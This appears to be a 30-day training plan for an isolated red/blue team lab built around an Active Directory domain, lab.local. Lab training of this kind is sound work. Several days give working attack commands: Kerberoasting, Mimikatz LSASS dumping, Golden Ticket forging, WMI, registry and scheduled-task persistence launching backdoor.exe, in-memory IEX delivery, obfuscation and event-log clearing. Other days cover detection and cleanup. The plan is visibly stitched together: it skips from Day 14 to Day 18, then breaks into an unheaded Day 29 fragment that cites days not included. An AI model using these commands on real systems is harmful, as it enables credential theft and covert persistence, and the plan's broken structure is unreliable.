30-Day Hybrid Cybersecurity Lab Plan

Welcome to your comprehensive guide for building and mastering a hybrid cybersecurity lab environment. This plan outlines daily goals and steps to enhance your red team and blue team skills, from basic VM setup to advanced threat hunting and adversary emulation.

Day 1 — Install Kali Linux Attacker VM

Goal: Install VirtualBox or VMware and set up a Kali Linux attacker VM with secure, isolated networking and a static IP for predictable lab operations.

Step 1 — Install Your Virtualization Platform

  • Option A: VirtualBox Download (Free, lightweight)
  • Option B: VMware Workstation Player (Free for non-commercial use, smoother performance)

Step 2 — Download Kali Linux

Get the latest Kali Linux VirtualBox or VMware image. Download the image that matches your virtualization software.

Step 3 — Import Kali into Your Virtualization Software

  • In VirtualBox: File → Import Appliance → select the .ova file.
  • In VMware: Open a Virtual Machine → select the .vmx file.

Step 4 — Initial Setup

  • Boot Kali and log in: Username: kali Password: kali
  • Update your system:
    sudo apt update && sudo apt upgrade -y
  • Install common tools:
    sudo apt install bloodhound neo4j crackmapexec impacket-scripts -y

Step 5 — Configure Host-Only Networking

  • Create a Host-Only network in VirtualBox or VMware.
  • Assign Kali a static IP (e.g., 192.168.56.10, subnet 255.255.255.0, no gateway).
  • Ensure Windows VMs will be in the same subnet later for direct communication.

Completion Checklist:

✅Virtualization software installed
✅Kali Linux VM imported and updated
✅Host-Only network created and Kali assigned a static IP
✅Internet access blocked from lab network

Day 2 — Install & Configure Windows 10 Target VM

Goal: Set up a Windows 10 Pro target machine with a static IP from the lab plan and verify connectivity with the Kali attacker machine.

Step 1 — Download Windows 10 ISO

Official ISO from Microsoft: https://www.microsoft.com/software-download/windows10ISO
Choose Windows 10 64-bit.

Step 2 — Create the VM

  • VirtualBox: New VM → Name: Win10-Target → Type: Microsoft Windows → Version: Windows 10 (64-bit)
    RAM: 2 GB minimum (4 GB recommended), Disk: 40 GB+
  • VMware: Create New Virtual Machine → Installer disc image (ISO) → Choose ISO
    Similar RAM and disk allocation

Step 3 — Configure Networking

Use only one network adapter set to Host-Only (VirtualBox) or your chosen Host-Only network (VMware) to ensure isolation from the internet.

Step 4 — Install Windows 10

Boot from the ISO and follow installation prompts.
If asked for a product key, select I don’t have a product key.
Choose Windows 10 Pro for additional administrative and domain features.

Step 5 — Assign Static IP

  • IP: 192.168.56.11
  • Subnet Mask: 255.255.255.0
  • Default Gateway: leave blank
  • Preferred DNS Server: 192.168.56.20 (future AD server)
  • Path: Control Panel → Network and Sharing Center → Change adapter settings → Right-click adapter → Properties → Internet Protocol Version 4 (TCP/IPv4) → Properties

Step 6 — Test Connectivity

  • From Windows:
    ping 192.168.56.10
  • From Kali:
    ping 192.168.56.11

Both should succeed. Pinging 8.8.8.8 should fail, confirming no internet access.

End of Day 2 Success Criteria:

✅Windows 10 Pro VM installed
✅Static IP assigned
✅Communication with Kali verified
✅Lab remains isolated from the internet

Day 3 — Install & Configure Windows Server 2019 with Active Directory

Goal: Set up a Windows Server 2019 machine as a Domain Controller (DC) with DNS for your lab’s Active Directory environment, assign it the static IP from the plan, and ensure it communicates with Kali and the Windows 10 target.

Step 1 — Download Windows Server 2019 ISO

Official ISO from Microsoft Evaluation Center: https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019
Choose the ISO file, Standard or Datacenter edition.

Step 2 — Create the VM

  • VirtualBox: New VM → Name: Win2019-AD → Type: Microsoft Windows → Version: Windows 2019 (64-bit)
    RAM: 2–4 GB (more if running multiple services), Disk: 40 GB+
  • VMware: Create New Virtual Machine → Installer disc image (ISO) → Choose ISO
    Same RAM and disk allocation

Step 3 — Configure Networking

Single network adapter on Host-Only network. This matches the IP plan’s isolated lab network.

Step 4 — Install Windows Server 2019

Boot from ISO
Select Windows Server 2019 Standard (Desktop Experience)
Follow prompts to create an admin password

Step 5 — Assign Static IP

  • IP: 192.168.56.20
  • Subnet Mask: 255.255.255.0
  • Default Gateway: leave blank
  • Preferred DNS Server: 127.0.0.1 (it will be the DNS server)
  • Path: Control Panel → Network and Sharing Center → Change adapter settings → Right-click adapter → Properties → Internet Protocol Version 4 (TCP/IPv4) → Properties

Step 6 — Install Active Directory Domain Services (AD DS)

  • Open Server Manager
  • Click Add roles and features
  • Choose Role-based or feature-based installation
  • Select Active Directory Domain Services
  • Accept dependencies and install

Step 7 — Promote Server to Domain Controller

  • In Server Manager, click the yellow warning flag → Promote this server to a domain controller
  • Create a new forest: Root domain name: lab.local
  • Set a Directory Services Restore Mode (DSRM) password
  • Accept defaults for DNS and NetBIOS
  • Install and reboot

Step 8 — Verify & Test

  • From Windows 10 Target:
    ping 192.168.56.20
    nslookup lab.local
  • From Kali:
    ping 192.168.56.20

Ensure both Windows machines can resolve domain names via the AD server’s DNS.

End of Day 3 Success Criteria:

✅Server 2019 installed with Desktop Experience
✅Static IP assigned
✅AD DS installed and server promoted to DC
✅DNS functioning within the lab
✅Connectivity confirmed between Kali, Windows 10, and Server 2019

Day 4 — Join Windows 10 Target to the Active Directory Domain

Goal: Connect the Windows 10 Pro target machine to the lab.local domain hosted on your Windows Server 2019 Domain Controller, verify domain membership, and prepare for Active Directory enumeration.

Step 1 — Set Windows 10 DNS to the Domain Controller

  • On the Windows 10 target: Go to Control Panel → Network and Sharing Center → Change adapter settings
  • Right-click the Host-Only adapter → Properties
  • Select Internet Protocol Version 4 (TCP/IPv4) → Properties
  • Set: Preferred DNS Server: 192.168.56.20 (DC’s IP)
  • Alternate DNS: leave blank

Step 2 — Join the Domain

  • Press Win + R, type sysdm.cpl, and press Enter
  • Go to the Computer Name tab
  • Click Change…
  • Under Member of, select Domain and enter: lab.local
  • Click OK
  • When prompted, enter the domain admin username and password created on the DC during Day 3
  • If successful, you’ll see a “Welcome to the lab.local domain” message

Step 3 — Restart the Windows 10 Target

  • Reboot is required to apply domain membership changes
  • At the login screen, click Other user and log in using a domain account:
    lab\\Administrator<password>

Step 4 — Verify Domain Membership

  • Open Command Prompt and run:
    systeminfo | findstr /B /C:"Domain"
  • You should see:
    Domain: lab.local
  • You can also run:
    whoami
    and confirm the format: lab\\username

Step 5 — Test Connectivity

  • Ping DC by hostname:
    ping win2019-ad.lab.local
  • Run DNS resolution check:
    nslookup win2019-ad.lab.local

End of Day 4 Success Criteria:

✅Windows 10 target is joined to lab.local
✅DNS points to DC (192.168.56.20)
✅Domain logins work
✅Hostname and DNS resolution confirmed

Day 5 — Active Directory Enumeration with BloodHound & PowerView

Goal: Use your Kali attacker machine to perform your first domain reconnaissance against the lab.local environment, mapping relationships and identifying attack paths.

Step 1 — Prepare Kali for BloodHound

  • Start Neo4j database:
    sudo neo4j console
    Default login: neo4j / neo4j (you will be prompted to change this)
  • Launch BloodHound:
    bloodhound &

Step 2 — Collect Data with SharpHound

  • Copy SharpHound.exe from Kali to the Windows 10 target:
    sudo cp /usr/share/bloodhound/collectors/SharpHound.exe /var/www/html/
    (or share via SMB/HTTP)
  • On Windows 10 (as a domain user), run:
    .\SharpHound.exe -c All
    This will create a .zip file with collected data.
  • Transfer the .zip back to Kali.

Step 3 — Import Data into BloodHound

  • In BloodHound GUI, log in with your Neo4j credentials.
  • Drag and drop the SharpHound .zip into the interface.
  • Explore built-in queries like:
    • “Find all Domain Admins”
    • “Shortest paths to Domain Admins”
    • “Users with unconstrained delegation”

Step 4 — Enumerate with PowerView

  • On the Windows 10 target (domain joined), load PowerView:
    Import-Module .\PowerView.ps1
  • Useful commands:
    • Get current domain info:
      Get-Domain
    • List domain users:
      Get-DomainUser
    • List domain computers:
      Get-DomainComputer
    • List domain groups:
      Get-DomainGroup

Step 5 — Document Findings

  • Record any high-value accounts, misconfigurations, or interesting group memberships.
  • Note shortest attack paths from BloodHound for later exploitation.

End of Day 5 Success Criteria:

✅SharpHound executed and data imported into BloodHound
✅PowerView used to enumerate domain users, computers, and groups
✅At least one potential attack path identified

Day 6 — Domain Privilege Escalation

Goal: Leverage enumeration results from Day 5 to escalate privileges within the lab.local domain, moving toward Domain Admin access.

Step 1 — Review BloodHound Data

  • Reopen your BloodHound session from Day 5.
  • Look for attack paths leading from your current user to high-value targets (e.g., Domain Admins).
  • Common findings to focus on:
    • Users with GenericAll or GenericWrite on high-privilege groups.
    • Computers with Local Admin rights you can access.
    • Accounts with Kerberoastable service tickets.

Step 2 — Exploit Kerberoastable Accounts

  • From Kali, request service tickets:
    GetUserSPNs.py lab.local/<user>@lab.local -dc-ip 192.168.56.20
  • Crack tickets with Hashcat or John the Ripper:
    hashcat -m 13100 hash.txt rockyou.txt
  • If successful, use the cracked password for further access.

Step 3 — Abuse Delegation Rights

  • If BloodHound flags unconstrained delegation: Gain access to the host. Monitor for TGTs of privileged users.
  • For constrained delegation, attempt S4U2Self abuse with tools like Rubeus.

Step 4 — Lateral Movement to Privileged Systems

  • Use valid credentials to connect via:
    crackmapexec smb 192.168.56.x -u <user> -p <pass> --shares
  • Deploy PsExec or WinRM (evil-winrm) to access target systems where you have admin rights.

Step 5 — Escalate to Domain Admin

  • Once on a host with high privileges, dump credentials from LSASS:
    Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"
  • Use captured credentials to access the Domain Controller.

Step 6 — Document the Attack Path

  • Record each step from initial user to Domain Admin.
  • Save commands, outputs, and any cracked credentials for reference.

End of Day 6 Success Criteria:

✅At least one successful privilege escalation path executed
✅Domain Admin or equivalent high-level access achieved
✅Full attack chain documented

Day 7 — Domain Persistence Techniques

Goal: Implement persistence mechanisms in the lab.local environment to maintain access after credential changes or reboots, covering both local and domain-level techniques.

Step 1 — Scheduled Tasks for Persistence

  • On a compromised machine, create a scheduled task to run your payload:
    schtasks /create /sc onlogon /tn "Updater" /tr "C:\\Windows\\System32\\backdoor.exe" /ru SYSTEM
  • Verify with:
    schtasks /query /tn "Updater"

Step 2 — WMI Event Subscription

$Filter=Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name='LogonTrigger';EventNamespace='root\cimv2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession'"}$Consumer=Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name='PayloadConsumer';CommandLineTemplate='C:\\Windows\\System32\\backdoor.exe'}Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$Filter;Consumer=$Consumer}

This survives reboots and runs as SYSTEM.

Step 3 — Registry Run Keys

  • Add a persistence entry to run on logon:
    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\\Windows\\System32\\backdoor.exe"

Step 4 — Domain Group Policy Logon Script

  • On the Domain Controller: Open Group Policy Management
  • Edit the Default Domain Policy
  • Navigate to User Configuration → Windows Settings → Scripts (Logon/Logoff)
  • Add your script to execute at user logon across the domain

Step 5 — Golden Ticket Persistence (Advanced)

  • If you have KRBTGT hash from DC, create a Golden Ticket with Mimikatz:
    mimikatz # kerberos::golden /user:Administrator /domain:lab.local /sid:<Domain_SID> /krbtgt:<KRBTGT_hash> /id:500
  • Inject the ticket into your session:
    mimikatz # kerberos::ptt <ticket.kirbi>

Grants indefinite domain access until KRBTGT password is reset twice.

End of Day 7 Success Criteria:

✅At least two persistence mechanisms implemented and tested
✅One domain-level persistence method working across multiple hosts
✅All methods documented with steps for both deployment and removal

Day 8 — Detection & Monitoring for Persistence and Privilege Escalation

Goal: Implement logging and monitoring in the lab.local domain to detect the persistence methods and privilege escalation techniques practiced in previous days.

Step 1 — Install and Configure Sysmon

  • Download Sysmon from Microsoft Sysinternals: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
  • Install with a recommended config (SwiftOnSecurity’s config is popular):
    sysmon -accepteula -i sysmonconfig.xml
  • Ensure Sysmon is set to start automatically after reboot.

Step 2 — Enable PowerShell Logging

  • On each machine, enable: Module Logging, Script Block Logging, Transcription
  • Group Policy path:
    Computer Configuration → Administrative Templates → Windows PowerShell

Step 3 — Configure Windows Event Forwarding (WEF)

  • Set the Domain Controller as the event collector.
  • Configure source machines (Windows 10 target, other domain systems) to forward relevant event logs: Security, Microsoft-Windows-Sysmon/Operational, Windows PowerShell

Step 4 — Detection for Persistence Methods

  • Monitor for:
    • Scheduled Task Creation: Event ID 4698
    • Registry Run Key Changes: Sysmon Event ID 13
    • WMI Event Subscription: Event ID 5861
    • Group Policy Script Changes: Event ID 5136 (Directory Service Changes)
  • Set up alerts in your SIEM or Event Viewer filters.

Step 5 — Detection for Privilege Escalation

  • Monitor for:
    • Kerberoasting Activity: Event ID 4769 (Service Ticket Requests)
    • Pass-the-Hash/Ticket: Event IDs 4624 (logon) with unusual logon types (e.g., Type 3, 9, 10)
    • LSASS Access: Sysmon Event ID 10 (Process Access to LSASS)

Step 6 — Test Your Monitoring

  • Re-run one or two persistence methods from Day 7.
  • Trigger a simple privilege escalation attempt.
  • Confirm that logs appear in Sysmon and Event Viewer.
  • Verify events are forwarded to the DC collector if WEF is enabled.

End of Day 8 Success Criteria:

✅Sysmon installed and configured on all lab systems
✅PowerShell logging enabled
✅WEF configured and operational
✅Alerts or filters in place for persistence and privilege escalation indicators
✅Successful detection of test activities

Day 9 — Purple Team Simulation: Attack and Detect

Goal: Run realistic persistence and privilege escalation attempts (red team) against the lab.local environment while actively monitoring and detecting them (blue team) in real time.

Step 1 — Prepare Monitoring Tools

  • Ensure Sysmon, PowerShell logging, and Windows Event Forwarding from Day 8 are operational.
  • Have Event Viewer open on the Domain Controller and the target machine.
  • Optionally, run a SIEM or log aggregation tool (e.g., Splunk, ELK, Wazuh) if available in the lab.

Step 2 — Choose Red Team Scenarios

  • Pick at least two persistence methods from Day 7:
    • Scheduled task creation
    • WMI event subscription
    • Registry run key modification
  • Pick at least one privilege escalation attempt from Day 6:
    • Kerberoasting
    • Pass-the-Hash
    • LSASS credential dumping

Step 3 — Execute the Red Team Actions

  • Perform the selected persistence methods on the Windows 10 target or another lab host.
  • Carry out the privilege escalation attempt from a standard domain user account.
  • Document the exact commands, accounts used, and timestamps.

Step 4 — Blue Team Monitoring and Detection

  • On the Domain Controller, watch for:
    • Scheduled Task Creation → Event ID 4698
    • Registry Modification → Sysmon Event ID 13
    • WMI Event Subscription → Event ID 5861
    • Kerberoasting Service Ticket Requests → Event ID 4769
    • Pass-the-Hash or unusual logons → Event ID 4624 with suspicious logon types
    • LSASS Access → Sysmon Event ID 10
  • Correlate these events with the timestamps from Step 3.

Step 5 — Analyze and Improve Detection

  • Review which events triggered and which did not.
  • Adjust Sysmon config, PowerShell logging, or WEF subscription to close any gaps.
  • Add specific detection queries to your SIEM if used.

Step 6 — Document Findings

  • Create a table with: Red team action, Expected detection event, Actual detection result, Recommended improvements

End of Day 9 Success Criteria:

✅At least two persistence and one privilege escalation action executed
✅Relevant detection events captured and verified
✅Gaps in detection identified and documented with remediation steps

Day 10 — Post-Exploitation Cleanup and Lab Reset

Goal: Remove persistence mechanisms, clear logs, and restore the lab.local environment to a clean state while preserving the ability to re-run attack and detection exercises.

Step 1 — Identify and Remove Persistence Methods

  • Review Day 7 notes and identify all persistence techniques deployed.
  • Remove each one:
    • Scheduled Tasks:
      schtasks /delete /tn "Updater" /f
    • WMI Event Subscriptions: 
      Get-WmiObject -Namespace root\subscription -Class __EventFilter | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
    • Registry Run Keys:
      reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /f
    • Group Policy Logon Scripts: Remove the script from:
      \\SYSVOL\\scripts

Step 2 — Remove Malicious Accounts or Groups

  • Check for unauthorized accounts:
    Get-ADUser -Filter * | Where-Object { $_.Description -like "*backdoor*" }
  • Remove if found:
    Remove-ADUser <username>

Step 3 — Clear or Archive Logs

  • Decide whether to archive logs for training or clear them for a fresh run.
  • Clear logs (lab use only):
    • wevtutil cl Security
    • wevtutil cl System
    • wevtutil cl "Microsoft-Windows-Sysmon/Operational"
  • Or export them for analysis before clearing:
    wevtutil epl Security C:\Logs\Security.evtx

Step 4 — Reset Compromised Passwords

  • Change passwords for: Domain Admin accounts, Any accounts used in attacks
  • Set-ADAccountPassword -Identity <username> -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "<NewPass>" -Force)

Step 5 — Validate the Reset

  • Reboot lab systems.
  • Confirm no persistence methods are triggered.
  • Test domain logins with updated credentials.

Step 6 — Snapshot or Backup the Clean State

  • In VirtualBox or VMware, take a snapshot labeled Post-Day10 Clean State.
  • This lets you quickly revert for future attack/detection cycles.

End of Day 10 Success Criteria:

✅All persistence methods removed
✅No unauthorized accounts remain
✅Logs either cleared or archived
✅Passwords reset for all compromised accounts
✅Clean lab snapshot created

Day 11 — Stealth Operations: Evading Detection While Attacking

Goal: Conduct enumeration, privilege escalation, and persistence activities in lab.local while attempting to avoid triggering alerts from the monitoring systems built in Days 8–9.

Step 1 — Understand Detection Triggers

  • Review detection rules from Days 8–9.
  • Identify high-noise commands and tools (e.g., Mimikatz, SharpHound) that are likely to trigger logs or alerts.
  • Plan stealthier alternatives.

Step 2 — Stealthy Enumeration

  • Use built-in Windows commands instead of known offensive tools:
    • List domain users:
      net user /domain
    • List computers:
      net view /domain
    • Query group membership:
      net group "Domain Admins" /domain
  • Leverage LDAP queries from PowerShell:
    ([adsisearcher]"(objectCategory=User)").FindAll()

Step 3 — Low-Noise Privilege Escalation

  • Avoid dropping known binaries to disk — run tools in-memory: Use PowerShell’s IEX (New-Object Net.WebClient).DownloadString() for script delivery.
  • Prefer living-off-the-land binaries (LOLBins) such as: runas, wmic, certutil for file transfers (lab use only)

Step 4 — Covert Persistence Techniques

  • Instead of obvious run keys or scheduled tasks, use:
    • Modifying existing scheduled tasks to execute payloads.
    • Adding startup scripts to legitimate GPOs with minimal change.
    • Using less common registry keys (e.g., HKCU\Environment) for execution.

Step 5 — Obfuscation

  • Use PowerShell obfuscation tools (in lab only) such as Invoke-Obfuscation.
  • Encode payloads with Base64 and execute with -EncodedCommand.
  • Change file names and function names to appear benign.

Step 6 — Test Detection Evasion

  • Perform one enumeration task, one escalation, and one persistence method using stealth techniques.
  • Monitor Sysmon, Event Viewer, and WEF for triggered events.
  • Record which actions bypassed detection and which were caught.

Step 7 — Improve Stealth

  • Modify techniques that were detected.
  • Introduce delays between commands to avoid burst detection patterns.
  • Blend activity with legitimate system and user processes.

End of Day 11 Success Criteria:

✅At least one enumeration, escalation, and persistence method executed without triggering alerts
✅Documented comparison of stealth vs. non-stealth techniques
✅Updated list of effective low-noise tactics for future lab exercises

Day 12 — Stealth Detection Tuning

Goal: Enhance your detection capabilities to identify stealthy enumeration, privilege escalation, and persistence techniques that bypassed monitoring during Day 11.

Step 1 — Review Stealth Activity Logs

  • Examine Sysmon, Event Viewer, and WEF logs from Day 11.
  • Identify stealth actions that went undetected.
  • Note which event IDs or behaviors were missing from your detection coverage.

Step 2 — Expand Sysmon Configuration

  • Add new rules to capture:
    • Rarely used binaries (LOLBins) such as certutil, wmic, bitsadmin.
    • PowerShell -EncodedCommand usage.
    • Execution from uncommon directories (e.g., C:\Users\Public).
  • Example rule snippet:
    <CommandLine condition="contains">-EncodedCommand</CommandLine>
  • Reload configuration:
    sysmon -c sysmonconfig_updated.xml

Step 3 — Enhance PowerShell Logging

  • Enable Module Logging and Script Block Logging for all PowerShell sessions.
  • Add logging for: Base64-encoded command execution, Obfuscation patterns
  • Regularly export logs for review.

Step 4 — Correlate Low-Noise Indicators

  • In SIEM or manual log review, create correlation rules:
    • certutil + outbound network connections
    • PowerShell execution + suspicious parent process
    • WMI process creation + privilege escalation events

Step 5 — Monitor Uncommon Persistence Locations

  • Expand monitoring to include:
    • HKCU\Environment
    • Modified legitimate scheduled tasks
    • Non-standard GPO modifications
  • Trigger alerts for changes in these locations.

Step 6 — Re-Test Stealth Techniques

  • Re-run one stealth enumeration, escalation, and persistence method from Day 11.
  • Monitor if new detection rules trigger.
  • Adjust configurations if needed.

End of Day 12 Success Criteria:

✅Detection rules updated to cover previously missed stealth activities
✅Successful alert generation for at least one previously undetected action
✅Documentation of updated Sysmon, PowerShell, and correlation rules

Day 13 — Advanced Red vs. Blue Simulation

Goal: Conduct a full-scale stealth intrusion simulation against lab.local, performing end-to-end attack sequences as the red team while the blue team actively monitors and responds, simulating a realistic adversary detection and hunt scenario.

Step 1 — Red Team Attack Planning

  • Define your attack chain:
    • Initial foothold (low-privileged domain user)
    • Enumeration (low-noise methods from Day 11)
    • Privilege escalation (covert techniques)
    • Lateral movement to a high-value target (e.g., DC)
    • Persistence establishment (stealthy method)
    • Data staging/exfiltration simulation
  • Document expected detection points from your Day 12 tuning.

Step 2 — Blue Team Monitoring Setup

  • Confirm:
    • Sysmon with updated Day 12 configuration is running on all systems
    • PowerShell logging is active
    • WEF is forwarding events to the DC or SIEM
  • Prepare custom queries/dashboards to track:
    • LOLBin usage
    • Encoded PowerShell commands
    • Kerberos ticket anomalies
    • WMI and scheduled task events

Step 3 — Execute the Red Team Operation

  • Gain access to a standard domain user account.
  • Perform low-noise enumeration to identify potential escalation paths.
  • Use a stealth escalation method (e.g., Kerberoasting with in-memory execution).
  • Laterally move to a privileged machine using covert channels (e.g., WinRM with encoded commands).
  • Deploy persistence via a modified legitimate scheduled task.
  • Simulate sensitive data collection (e.g., dummy files) and exfiltrate via a covert method.

Step 4 — Blue Team Detection and Response

  • Monitor live logs for indicators of the red team’s activity.
  • Investigate suspicious event IDs (e.g., 4698, 4769, 4624 with unusual logon types, Sysmon ID 1, 13, 10).
  • Attempt to identify the attack chain in real-time.
  • Respond by: Isolating compromised machines, Disabling compromised accounts, Terminating persistence mechanisms

Step 5 — Joint Debrief

  • Red team shares full attack chain, including: Commands used, Tools executed, Timestamps
  • Blue team shares detection points, missed events, and response times.
  • Compare results to planned detection coverage from Step 1.

Step 6 — Lessons Learned and Next Steps

  • Update detection rules for missed stealth activity.
  • Improve red team stealth tactics for harder-to-detect actions.
  • Plan next simulation with higher complexity (e.g., multiple compromised accounts, staged attacks).

End of Day 13 Success Criteria:

✅Complete attack chain executed by red team
✅Blue team detected and responded to multiple steps
✅Gaps in detection documented and action items created for improvement

Day 14 — Adversary Emulation: Real-World Threat Replication

Goal: Select a real-world APT group or ransomware actor known for targeting Windows environments, study their tactics, techniques, and procedures (TTPs) from the MITRE ATT&CK framework, and replicate their behaviors in your lab.local domain to test offensive execution and defensive detection.

Step 1 — Choose an Adversary Profile

  • Examples of groups to emulate:
    • APT29 (Cozy Bear) — stealthy espionage group targeting governments and enterprises.
    • FIN7 — financially motivated group with advanced phishing and persistence.
    • Conti Ransomware Group — high-impact ransomware operators.
  • Select one adversary whose TTPs align with the skills and tools available in your lab.

Step 2 — Research TTPs

  • Use these resources: MITRE ATT&CK, Threat intelligence reports from vendors like CrowdStrike, Mandiant, and CISA.
  • Map the chosen adversary’s known TTPs to ATT&CK IDs.
  • Categorize into stages: Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Exfiltration

Step 3 — Adapt TTPs for the Lab

  • Replace destructive payloads with benign scripts to avoid damaging your environment.
  • Example adaptations: Instead of ransomware encryption, simulate by zipping files. Instead of exfiltrating real data, copy harmless test data.

Step 4 — Execute the Emulation Plan (Red Team)

  • Follow the chosen group’s TTP chain step-by-step in your lab.
  • Use the same tools or equivalent open-source alternatives.
  • Record: Command lines, Execution times, Expected detection points

Step 5 — Monitor and Detect (Blue Team)

  • Use Sysmon, Event Viewer, and WEF to monitor for:
    • Indicators of compromise (IOCs) matching the adversary profile.
    • Specific event IDs from your Day 12 tuning.
    • New behaviors that were not previously seen in your lab.
  • Compare detected vs. missed activity.

Step 6 — Debrief and Improve

  • Document the full emulation: TTPs tested, Detection successes and failures, Recommendations for improving monitoring and response
  • Update your detection rules to address missed techniques.

End of Day 14 Success Criteria:

✅One real-world adversary profile selected and mapped to ATT&CK
✅Safe lab-friendly replication of key TTPs executed
✅Blue team detection analysis completed

Day 18 — Adversary Persistence Hunt

Goal: Conduct a focused blue team operation to search for and eradicate stealthy, long-term persistence mechanisms in lab.local that could survive typical incident response, ensuring a clean and secure environment.

Step 1 — Define Persistence Hunt Scope

  • Focus on persistence techniques from MITRE ATT&CK categories such as:
    • Registry run keys and startup folders
    • WMI event subscriptions
    • Modified or rogue scheduled tasks
    • Malicious Group Policy logon scripts
    • Kerberos Golden Tickets or Silver Tickets

Step 2 — Collect and Review Data Sources

  • Pull logs from: Sysmon (Event IDs 1, 13, 21), Security Event Logs (Event IDs 4698, 4702, 4769), Directory Services logs for GPO changes (Event ID 5136)
  • If available, query historical logs in your SIEM for persistence-related events.

Step 3 — Hunt for Persistence Indicators

  • Search for:
    • Scheduled tasks created or modified by unexpected accounts.
    • WMI filters and consumers in root\subscription.
    • Unusual entries in: HKCU\Software\Microsoft\Windows\CurrentVersion\Run, HKLM\Software\Microsoft\Windows\CurrentVersion\Run, HKCU\Environment
    • Recently modified scripts in SYSVOL for GPOs.
    • Active Kerberos tickets with unusually long lifetimes.

Step 4 — Investigate Suspicious Findings

  • Confirm whether each indicator is malicious or legitimate.
  • For registry keys or scheduled tasks, verify creation dates and associated executables.
  • For Kerberos tickets, check issuance details and compare with normal authentication patterns.

Step 5 — Eradicate Malicious Persistence

  • Remove malicious scheduled tasks:
    schtasks /delete /tn "<taskname>" /f
  • Delete rogue WMI subscriptions: 
    Get-WmiObject -Namespace root\subscription -Class __EventFilter | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
  • Clean malicious registry entries using reg delete.
  • Revert unauthorized GPO changes.
  • Invalidate Golden Tickets by resetting the KRBTGT account password twice.

Step 6 — Validate and Document

  • Re-run persistence hunting queries to confirm removal.
  • Log: Persistence methods found, Removal steps taken, Detection rules updated to catch similar future attempts

End of Day 18 Success Criteria:

✅All malicious persistence methods identified and removed
✅Detection rules updated for future coverage
✅Documentation completed with remediation steps and prevention recommendations

  • Establish persistence mechanisms that mimic normal user or system behavior:
    • Scheduled tasks disguised as legitimate maintenance jobs.
    • Registry entries under names matching standard OS or application keys.
    • Cloud automation scripts with benign-appearing descriptions.
  • Space out activity to avoid triggering pattern-based alerts.
  • Use legitimate tools (LOLBins) and processes for execution.

Step 2 — Blue Team Preparation

  • Expand anomaly detection baselines to include long-term behavior patterns.
  • Enable advanced logging:
    • Sysmon with detailed process and network event capture.
    • Cloud service activity logs with historical trend analysis.
  • Prepare for multi-week hunts with periodic log reviews.

Step 3 — Red Team Execution

  • Deploy persistence points that activate rarely (e.g., once every few days).
  • Conduct minimal reconnaissance at random intervals.
  • Use data staging methods that appear like standard file transfers or backups.
  • Avoid privilege escalation unless absolutely necessary to maintain access.

Step 4 — Blue Team Threat Hunting

  • Perform scheduled deep-dive hunts into:
    • Rarely used scheduled tasks or registry entries.
    • Cloud automation scripts or policies with recent modifications.
    • Processes that run infrequently but consistently over time.
  • Compare findings against baseline behaviors to identify outliers.

Step 5 — Containment and Verification

  • Isolate suspected persistence mechanisms for further analysis.
  • Remove confirmed malicious footholds while monitoring for fallback methods.
  • Conduct a post-removal watch period to ensure no reactivation occurs.

Step 6 — Debrief

  • Red team: Share concealment techniques, timing patterns, and methods that went undetected.
  • Blue team: Present anomalies found, detection gaps, and time to discovery.
  • Update detection rules to better spot low-frequency, low-noise activity.

End of Day 29 Success Criteria:

✅Blue team identified and eradicated long-term low-activity footholds
✅Detection coverage improved for rare or disguised malicious activity
✅Documented strategies for both defending against and executing long-game deception

Day 30 — Grand Finale Hybrid Breach Campaign

Goal: Conduct a multi-week, multi-vector red team campaign combining every tactic from Days 1–29 into one continuous hybrid breach operation. The blue team must defend against layered deception, persistence, cloud/on-prem pivots, and staged objectives under realistic pressure.

Step 1 — Campaign Planning

  • Red Team:
    • Create a detailed playbook that blends: Initial access (phishing, credential compromise, service exploitation), Lateral movement in both cloud and on-prem environments, Persistence methods from stealthy to noisy, Long-game deception with low-activity footholds.
    • Stage multiple objectives across the timeline.
  • Blue Team:
    • Prepare full-spectrum monitoring for all known tactics.
    • Establish clear escalation and containment procedures.
    • Assign roles for 24/7 simulated coverage during the campaign.

Step 2 — Initial Breach Phase

  • Red team gains footholds in both environments (cloud and on-prem) within the first simulated days.
  • Use different entry vectors for each to mask coordination.
  • Maintain stealth while beginning reconnaissance.

Step 3 — Escalation and Expansion

  • Conduct gradual privilege escalation.
  • Begin selective lateral movement, blending with normal operations.
  • Introduce deception elements to mislead the blue team.

Step 4 — Cross-Environment Pivots

  • Pivot from cloud to on-prem and vice versa, using techniques from Days 23–24.
  • Leverage hybrid identity and sync misconfigurations.

Step 5 — Sustained Operations

  • Keep persistence active in multiple forms: Long-term low-frequency footholds (Day 29), Redundant high-privilege persistence points.
  • Stage simulated exfiltration or destructive actions at planned intervals.

Step 6 — Blue Team Response

  • Actively hunt daily for indicators across both environments.
  • Manage multiple simultaneous alerts.
  • Adapt to changing TTPs throughout the campaign.

Step 7 — Campaign Climax

  • Red team executes a coordinated final push toward high-value objectives.
  • Blue team must prioritize containment and eradicate all red team access.

Step 8 — Final Debrief

  • Red team: Present full campaign timeline, objectives, and evasion tactics.
  • Blue team: Present detection points, response metrics, and lessons learned.
  • Jointly compile a master incident report and updated defense roadmap.

End of Day 30 Success Criteria:

✅Fully executed multi-phase hybrid campaign.
✅Comprehensive blue team detection and response documented.
✅Master incident report completed with actionable defense improvements.
